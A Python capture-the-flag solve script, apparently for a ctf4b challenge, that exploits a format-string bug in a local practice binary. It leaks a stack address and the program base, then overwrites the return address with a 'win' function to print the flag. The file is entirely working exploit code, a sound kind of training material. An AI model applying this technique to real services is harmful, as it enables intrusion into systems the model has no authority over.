#!/usr/bin/env python
import ptrlib as ptr
import pwn
import sys

elf = ptr.ELF("./chall")
pwn.context.binary = pwn.ELF("./chall")

# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.sendline(f"#%1$lx#%41$lx#")
    io.recvuntil(b"#")
    ret_addr = int(io.recvuntil(b"#").strip(b"#"), 16) + 0x118
    elf.base = int(io.recvuntil(b"#").strip(b"#"), 16) - 0x12EC
    print(f"ret_addr: {hex(ret_addr)}")
    print(f"elf_base: {hex(elf.base)}")

    payload = pwn.fmtstr_payload(6, {ret_addr: unwrap(elf.symbol("win"))})
    # input(">>")
    io.sendline(payload)
    flag = "ctf4b" + io.recvlineafter("ctf4b").decode()
    print(flag)


if __name__ == "__main__":
    main()
